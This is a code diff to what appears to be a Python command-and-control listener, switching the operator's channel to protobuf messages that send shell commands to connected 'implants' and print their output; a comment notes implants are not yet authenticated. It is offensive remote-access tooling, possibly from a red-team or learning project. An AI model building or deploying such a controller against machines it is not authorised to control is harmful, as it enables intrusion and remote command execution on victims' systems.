@@ -5,6 +5,8 @@ import socket
 import ssl
 import threading
 import uuid
+import sys
+from pb import implantpb_pb2
 from queue import Queue
 
 
@@ -79,6 +81,14 @@ class Listener:
 
             # Add the session
             id = self.sessions.add(conn, addr)
+            print(f"implant ID: {id}")
+
+            # TODO: Authenticate the implant before sending a confirmation
+            confirmation = implantpb_pb2.Message(
+                message_type=implantpb_pb2.Message.MessageType.RegistrationConfirmation,
+                data=implantpb_pb2.RegistrationConfirmation(id=id).SerializeToString()
+            ).SerializeToString()
+            conn.sendall(confirmation)
 
             logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
             logging.info(f"Accepted connection from {addr} | {id}")
@@ -91,11 +101,32 @@ def session(conn: ssl.SSLContext):
         if userin == "exit":
             break
 
-        conn.sendall(userin.encode("utf-8"))
+        # Turn the cmd into a protobuf Message
+        os_cmd = implantpb_pb2.OsCmd(cmd=userin)
+        message = implantpb_pb2.Message(
+            message_type=implantpb_pb2.Message.MessageType.OsCmd,
+            data=os_cmd.SerializeToString()
+        )
+        conn.sendall(message.SerializeToString())
         data = conn.recv(1024)
         if not data:
             break
         else:
             logging.basicConfig(filename="Command Log.txt", level=logging.INFO)
-            logging.info(data.decode("utf-8"))
-            print(data.decode("utf-8"))
+            # Decode the data into OsCmdOutput
+            message = implantpb_pb2.Message()
+            message.ParseFromString(data)
+            if message.message_type == implantpb_pb2.Message.MessageType.OsCmdOutput:
+                output = implantpb_pb2.OsCmdOutput()
+                output.ParseFromString(message.data)
+                logging.info(output.stdout)
+                if output.HasField("status") and output.code != 0:
+                    print(f"Status code: {output.code}")
+                if len(output.stderr) > 0:
+                    print("stdout:")
+                    sys.stdout.buffer.write(output.stdout)
+                    print()
+                    print("stderr:")
+                    sys.stdout.buffer.write(output.stderr)
+                else:
+                    sys.stdout.buffer.write(output.stdout)
